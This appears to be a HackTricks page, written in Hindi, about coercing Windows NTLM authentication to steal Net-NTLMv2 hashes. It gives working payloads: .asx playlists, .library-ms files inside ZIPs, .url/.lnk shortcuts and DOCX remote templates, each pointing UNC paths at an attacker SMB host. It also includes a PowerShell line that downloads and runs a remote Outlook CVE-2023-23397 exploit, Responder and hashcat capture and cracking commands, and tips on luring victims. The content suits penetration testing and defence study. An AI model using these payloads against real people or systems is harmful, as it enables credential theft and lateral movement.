# NTLM creds चुराने के स्थान

{{#include ../../banners/hacktricks-training.md}}

**इन बेहतरीन विचारों को जरूर देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन एक microsoft word फ़ाइल डाउनलोड करने से लेकर ntlm leaks स्रोत तक: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player प्लेलिस्ट (.ASX/.WAX)

यदि आप लक्ष्य को आपका नियंत्रित Windows Media Player प्लेलिस्ट खोलने या प्रीव्यू करने के लिए प्रेरित कर सकें, तो आप एंट्री को एक UNC path पर पॉइंट करके Net‑NTLMv2 leak कर सकते हैं। WMP संदर्भित मीडिया को SMB के माध्यम से प्राप्त करने का प्रयास करेगा और स्वतः प्रमाणीकृत होगा।

उदाहरण payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
संग्रह और cracking प्रवाह:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer ZIP archive के भीतर से सीधे खोले जाने पर .library-ms फ़ाइलों को असुरक्षित तरीके से संभालता है। अगर लाइब्रेरी परिभाषा किसी remote UNC path (उदा., \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को केवल ब्राउज़/लॉन्च करने से Explorer उस UNC को सूचीबद्ध करता है और हमलावर को NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे ऑफ़लाइन क्रैक किया जा सकता है या संभावित रूप से relay किया जा सकता है।

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- ऊपर दिए XML के साथ .library-ms फ़ाइल बनाएं (अपना IP/hostname सेट करें)।
- इसे ZIP करें (on Windows: Send to → Compressed (zipped) folder) और ZIP को टार्गेट पर भेजें।
- एक NTLM capture listener चलाएँ और इंतज़ार करें कि पीड़ित ZIP के अंदर से .library-ms खोले।

### Outlook कैलेंडर रिमाइंडर साउंड पाथ (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows कैलेंडर आइटम्स में extended MAPI property PidLidReminderFileParameter को प्रोसेस करता था। यदि वह property किसी UNC path (e.g., \\attacker\share\alert.wav) की ओर इशारा करती थी, तो reminder के फायर होते ही Outlook SMB share से संपर्क कर लेता था, और बिना किसी क्लिक के उपयोगकर्ता का Net‑NTLMv2 leak हो जाता था। इसे 14 मार्च 2023 को patched किया गया था, फिर भी यह legacy/untouched fleets और historical incident response के लिए अभी भी अत्यंत प्रासंगिक है।

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener पक्ष:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
नोट्स
- एक victim को केवल तब Outlook for Windows चल रहा होना चाहिए जब reminder ट्रिगर हो।
- यह leak Net‑NTLMv2 देता है जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।

### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer शॉर्टकट आइकन स्वचालित रूप से रेंडर करता है। हाल के शोध से पता चला कि Microsoft के April 2025 patch के बाद भी UNC‑icon shortcuts के लिए, shortcut target को एक UNC path पर host करके और icon को local रखकर बिना किसी क्लिक के NTLM authentication trigger करना संभव था (patch bypass को CVE‑2025‑50154 असाइन किया गया)। सिर्फ़ फ़ोल्डर देखने भर से Explorer remote target से metadata प्राप्त करता है, और NTLM attacker SMB server को भेज देता है।

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
PowerShell के माध्यम से प्रोग्राम शॉर्टकट payload (.lnk):
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
डिलीवरी के विचार
- शॉर्टकट को ZIP में रखें और पीड़ित से उसे ब्राउज़ करवाएँ।
- शॉर्टकट को उस writable share पर रखें जिसे पीड़ित खोलेगा।
- उसी फ़ोल्डर में अन्य lure files के साथ मिलाएँ ताकि Explorer आइटम का preview दिखाए।


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents एक external template को reference कर सकते हैं। यदि आप attached template को एक UNC path पर सेट करते हैं, तो दस्तावेज़ खोलने पर SMB पर authenticate होगा।

न्यूनतम DOCX relationship बदलाव (inside word/):

1) word/settings.xml को संपादित करें और attached template reference जोड़ें:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels संपादित करें और rId1337 को अपने UNC की ओर निर्देशित करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में पुनः पैक करके डिलीवर करें। अपना SMB capture listener चलाएँ और इसे खोलने का इंतज़ार करें।

For post-capture ideas on relaying or abusing NTLM, check:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
